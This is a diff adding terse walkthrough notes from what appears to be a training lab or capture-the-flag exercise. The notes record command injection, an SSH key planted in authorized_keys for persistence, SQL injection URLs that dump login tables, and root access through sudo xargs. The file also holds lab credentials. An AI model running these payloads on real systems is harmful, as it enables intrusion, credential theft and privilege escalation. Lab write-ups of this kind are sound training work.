@@ -1,0 +1,47 @@
+stack username  password          lin-internet
+20 	MCMA-001-M 	aSEU9cQ35e9ESLC 	10.50.21.233
+
+ssh student@localhost -L 1111:10.50.21.233:80
+firefox
+10.50.21.233:80
+10.50.21.233/robots.txt
+10.50.21.233/Onlinetools   #possible vulns(system to ping,todays stories,select story to read)
+select story to read: vuln to command inject (;whoami) www-data
+;cat /etc/passwd    #home directory of www-data is /var/www
+;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4utoexwoyMPdF9LQH+4yrBV3+xzR83SnCA8LqujuGDGd2SKWPBN0kRKbuBSG50jW52ica4EtEgJY/S8/1S69fLu1PsM7OfN5G3pEXtbA0wpBl4tZZcxQTMiJj2LOtmvu7hfbHV7T24ssbRDgf9Q92+0ropq/ugd2ut/+fLBVDJMDizR63qpOJPUnHlOcsKBdlvya4lAuj9RN9aJBJURz0HxNHKYezRcIQ7zbioo2q2az1AXf75uQ8+Bd0DHEZ5zpSPFWT5d6Gq4N7pZtR8fiIR2rcbHomhFiwQ3PkWM7c2Z7DOCAcJTTSusKzooDismaBONCT5mG7ow6YYBR7h1xD student@lin-ops" >> /var/www/.ssh/authorized_keys
+ssh www-data@10.50.21.233
+bash
+cd html
+cd share
+http://10.50.21.233/share
+http://10.50.21.233/share/Untitled_Diagram.png
+Todays stories: Go   #hitting go shows Possible_end.txt and To_War.txt
+;find / -iname To_War*
+;cat /var/www/html/stories/To_War.txt
+;find / -iname Possible_end.txt
+;cat /var/www/html/stories/Possible_end.txt
+Array ( [0] => Msmith [name] => Msmith [1] => Squanchy [password] => Squanchy ) 1Array ( [0] => Fpalic [name] => Fpalic [1] => Birdperson [password] => Birdperson ) 1Array ( [0] => Kmichae [name] => Kmichae [1] => MrMeeseeks [password] => MrMeeseeks ) 1
+http://0.0.0.0:3333/forces/forcespick.php?Locations=4%20or%201=1
+http://0.0.0.0:3333/forces/forcespick.php?Locations=4 UNION SELECT 1,2,3,4 ;#
+http://0.0.0.0:3333/forces/forcespick.php?Locations=4%20UNION%20SELECT%20table_schema,table_name,column_name,4%20FROM%20information_schema.columns;%20#
+http://0.0.0.0:3333/forces/forcespick.php?Locations=4%20UNION%20SELECT%20id,name,rank,unit%20FROM%20forces.commanders;%20#
+http://0.0.0.0:3333/forces/forcespick.php?Locations=4%20UNION%20SELECT%20user,name,password,4%20FROM%20auth_users.logins;%20#
+Rsanch   Rick Sanchez     ScaryTerry
+Msmith   Morty Smith      Squanchy
+Fpalic   Frank Palicky Birdperson
+Kmichae  Krombopulos Michael    MrMeeseeks
+
+port 21254 is abnormal on 192.168.28.177
+Fpalic  is the user for the 192.168.28.177
+bash
+sudo -l
+gtfobins   #found xargs is vuln
+sudo xargs -a /dev/null sh
+whoami  #root
+cd root
+found Important.txt  and svch0st.sh   which contained flags
+
+
+
+
+
